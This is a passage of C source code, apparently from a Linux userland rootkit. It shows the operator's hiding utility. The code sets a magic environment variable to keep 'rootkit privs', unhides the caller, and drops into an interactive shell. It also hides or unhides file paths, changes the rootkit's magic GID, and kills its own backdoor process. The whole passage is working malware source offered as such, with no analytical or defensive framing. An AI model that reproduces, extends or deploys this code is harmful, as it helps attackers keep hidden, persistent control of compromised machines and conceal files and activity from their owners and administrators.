void option_err(void){
    printf("%s\n", ERR_NO_OPTION);
    exit(-1);
}

void do_self(void){
    int putenv_status;

    /* we need some kind of warning message. this will do for now. */
    printf("unhiding self...\n");

    /* set the magic environment variable,
     * so we still have our rootkit privs. */
    if(getenv(BD_VAR) == NULL){
        putenv_status = putenv(BD_VAR"=1");
        if(putenv_status != 0)
            printf("failed trying to set the magic environment variable.\ncontinuing anyway...\n");
    }

    unhide_self();
    system("id");
    printf("you're now totally visible. 'exit' when you want to return to being hidden.\n");
    execl("/bin/sh", "-i", NULL);
    hide_self();
    exit(0);
}

void do_hidingutil(char *const argv[]){
    char *option, *path;
    int path_status;

    option = argv[1];
    if(option == NULL)
        option_err();

#ifdef READ_GID_FROM_FILE
    if(!strcmp("changegid", option)){
        printf("you are about to change the rootkit's GID.\n");
        printf("the rootkit will hide its own files, but not files you have created.\n");
        printf("once the magic GID has been changed, your backdoor process will be killed\n");
        printf("and you will have to log back in.\n");
        printf("press enter if you really wanna do this.\n");
        getchar();
        printf("current magic GID: %d\n", readgid());
        gid_t newgid;
        changerkgid(&newgid);
        printf("new magic GID: %d\n", newgid);
        hook(CKILL);
        call(CKILL, getppid(), SIGKILL);
        call(CKILL, getpid(), SIGKILL);
        exit(0);
    }
#endif


    if(!strcmp("unhideself", option))
        do_self();

    path = argv[2];
    if(path == NULL)
        option_err();

    hook(CACCESS);
    path_status = (long)call(CACCESS, path, F_OK);

    if(path_status != 0){
        printf("%s\n", ERR_ACSS_PATH);
        exit(-1);
    }

    /* hide or unhide given path */
    if(!strncmp("hide", option, 4)){
        switch(hide_path(path)){
            case PATH_DONE:
                printf("%s\n", ALRDY_HIDDEN_STR);
                break;
            case PATH_SUCC:
                printf("%s\n", PATH_HIDDEN_STR);
                break;
            case PATH_ERR:
                printf("%s\n", ERR_HIDING_PATH);
                break;
        }
    }else if(!strncmp("unhide", option, 6)){
        switch(unhide_path(path)){
            case PATH_DONE:
                printf("%s\n", ALRDY_VISIBLE_STR);
                break;
            case PATH_SUCC:
                printf("%s\n", PATH_VISIBLE_STR);
                break;
            case PATH_ERR:
                printf("%s\n", ERR_UNHIDING_PATH);
                break;
        }
    }else option_err();

    exit(0);
}